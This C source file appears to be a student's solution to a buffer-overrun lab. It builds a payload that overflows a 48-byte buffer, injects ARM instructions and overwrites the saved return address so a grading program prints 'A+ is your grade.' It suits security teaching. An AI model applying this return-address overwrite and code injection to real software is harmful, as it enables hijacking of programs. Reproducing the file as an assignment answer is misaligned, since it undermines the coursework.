/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Anish K                                                    */
/*--------------------------------------------------------------------*/

/* Produces a file called dataAplus that exploits the buffer overrun 
   vulnerability to produce an "A+" grade recommendation.
   
   Principles of operation:
   1. Writes a chosen name (here "AnishKKata") and a specially crafted 
      string ("A+ is your grade.%c") into the bss section (the name array).
   2. Aligns the memory so that injected instructions (ADR, MOV, B) are 
      properly placed in the bss section following the written strings.
   3. Overwrites the return address on the stack frame so that, upon 
      returning, execution jumps into our injected instructions, which 
      cause the program to print "A+ is your grade." instead of the 
      original grade.
*/

/*--------------------------------------------------------------------*/
/* Interactive behavior of main:
   - Does not accept command-line arguments.
   - Does not read from stdin.
   - Writes a crafted payload to the file "dataAplus".
   - Returns 0 on success.
*/
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

enum {
    MAX_BUFFER_BYTES = 48,    /* Total bytes in buffer we must fill */
    GRADE_ADDR = 0x420044,    /* Address of the 'grade' variable in data section */
    PRINT_INSTR_ADDR = 0x400874, /* Address in main where printing occurs */
};

int main(void) {
    /* Descriptive variable names */
    int iByteCount = 0;                      /* Counts total bytes written into the file */
    unsigned long ulStringStartAddr = 0x420058; /* Start of 'name' array in bss */
    unsigned long ulInstrStartAddr = 0x420058;  /* Address where instructions begin after strings */
    unsigned int uiInstr;                    /* To hold assembled instructions */

    /* Open the file where we write our crafted payload */
    FILE *psFile = fopen("dataAplus", "w");
    if (psFile == NULL) {
        return 1; /* If file can't be opened, exit with error */
    }

    /* Write attacker's name into bss */
    /* "AnishKKata" is 10 chars: 'A' 'n' 'i' 's' 'h' 'K' 'K' 'a' 't' 'a' */
    fputs("AnishKKata", psFile);
    iByteCount += 10;

    /* Write a null terminator after the name */
    fputc('\0', psFile);
    iByteCount++;
    ulStringStartAddr += iByteCount; /* Advance address pointer past the name+null */

    /* Write the grade string "A+ is your grade.%c" plus a null terminator.
       Counting characters: A(1) + (2) space(3) i(4) s(5) space(6) y(7) o(8) u(9) r(10)
       space(11) g(12) r(13) a(14) d(15) e(16) .(17) %(18) c(19)
       That's 19 chars plus 1 null terminator = 20 total bytes */
    fputs("A+ is your grade.%c", psFile);
    fputc('\0', psFile);
    iByteCount += 20;
    ulInstrStartAddr += iByteCount;

    /* Align ulInstrStartAddr on a multiple of 4 bytes, since instructions 
       must be word-aligned. Add zero bytes for padding if needed. */
    while (ulInstrStartAddr % 4 != 0) {
        fputc(0, psFile);
        iByteCount++;
        ulInstrStartAddr++;
    }

    /* Insert assembly instructions at ulInstrStartAddr:
       1) ADR x0, ulStringStartAddr
          Load the address of our crafted string into x0.
    */
    uiInstr = MiniAssembler_adr(0, ulStringStartAddr, ulInstrStartAddr);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
    iByteCount += 4;

    /* 2) MOV w1, '\n'
       Move a newline character into w1 so printf will print a newline after the grade.
       Note: This sets a register at runtime; it does NOT write a newline to our input file.
    */
    uiInstr = MiniAssembler_mov(1, '\n');
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
    iByteCount += 4;

    /* 3) B PRINT_INSTR_ADDR
       Branch to the instruction in main that prints the grade string.
       The PC will be at ulInstrStartAddr + 8 after executing the ADR and MOV, 
       so we branch from (ulInstrStartAddr + 8).
    */
    uiInstr = MiniAssembler_b(PRINT_INSTR_ADDR, ulInstrStartAddr + 8);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
    iByteCount += 4;

    /* Fill the remainder of the buffer with null bytes until we reach MAX_BUFFER_BYTES.
       This ensures we overwrite the stored return address correctly.
    */
    while (iByteCount < MAX_BUFFER_BYTES) {
        fputc(0, psFile);
        iByteCount++;
    }

    /* Overwrite return address: Write ulInstrStartAddr to force return into our instructions */
    fwrite(&ulInstrStartAddr, sizeof(unsigned long), 1, psFile);

    /* Close the file. No need to write EOF or newline. The grader reads until end-of-file. */
    fclose(psFile);

    return 0;
}